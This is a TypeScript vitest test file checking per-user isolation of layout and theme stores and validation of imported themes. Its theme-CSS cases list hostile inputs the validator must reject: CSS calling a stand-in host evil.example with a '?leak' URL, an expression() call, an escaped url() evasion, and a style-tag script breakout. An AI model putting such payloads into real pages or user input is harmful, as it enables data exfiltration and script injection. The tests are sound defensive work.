import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { insertUser, useTempDatabase } from "@/test/db";

let db: Awaited<ReturnType<typeof useTempDatabase>>;

beforeAll(async () => {
  db = await useTempDatabase("isolation");
  await insertUser("alice");
  await insertUser("bob");
});

afterAll(async () => {
  await db.cleanup();
});

describe("one user never reads or changes another user's data", () => {
  it("layouts", async () => {
    const { getUserLayout, resetUserLayout, saveUserLayout } = await import("./layout/store");
    saveUserLayout("alice", { version: 1, slots: { "rail.main": { order: ["core.today"], hidden: ["core.settings"] } }, styles: {} });
    expect(getUserLayout("bob").slots).toEqual({});
    saveUserLayout("bob", { version: 1, slots: {}, styles: { "core.today": { label: "Bob" } } });
    resetUserLayout("bob");
    expect(getUserLayout("alice").slots["rail.main"]?.hidden).toEqual(["core.settings"]);
  });

  it("themes", async () => {
    const { getUserTheme, saveUserTheme } = await import("./theme/store");
    saveUserTheme("alice", "custom", { name: "Alice", base: "dark", tokens: { "--color-accent": "#ff0000" } });
    expect(getUserTheme("bob")).toEqual({ mode: "system" });
    saveUserTheme("bob", "light");
    expect(getUserTheme("alice").theme?.name).toBe("Alice");
  });
});

describe("imported data is validated", () => {
  it("refuses a layout with unknown keys or bad colors", async () => {
    const { saveUserLayout } = await import("./layout/store");
    expect(() => saveUserLayout("alice", { version: 1, slots: {}, styles: { x: { color: "red; background:url(x)" } } })).toThrow();
    expect(() => saveUserLayout("alice", { version: 2, slots: {}, styles: {} })).toThrow();
  });

  it.each([
    "@import url(https://evil.example/x.css);",
    "body { background: url(https://evil.example/?leak) }",
    "a { b: expression(alert(1)) }",
    String.raw`a { background: u\72l(x) }`,
    "</style><script>alert(1)</script>",
    "@font-face { font-family: x; src: local(x) }",
  ])("refuses theme CSS %j", async (css) => {
    const { themeSchema } = await import("./theme/schema");
    expect(themeSchema.safeParse({ name: "Bad", base: "light", tokens: {}, css }).success).toBe(false);
  });

  it("refuses unknown tokens and unsafe token values", async () => {
    const { themeSchema } = await import("./theme/schema");
    expect(themeSchema.safeParse({ name: "x", base: "light", tokens: { "--anything": "#fff" } }).success).toBe(false);
    expect(themeSchema.safeParse({ name: "x", base: "light", tokens: { "--color-accent": "url(x)" } }).success).toBe(false);
    expect(themeSchema.safeParse({ name: "x", base: "light", tokens: { "--color-accent": "#1f4a7a", "--radius-panel": "12px" } }).success).toBe(true);
  });
});
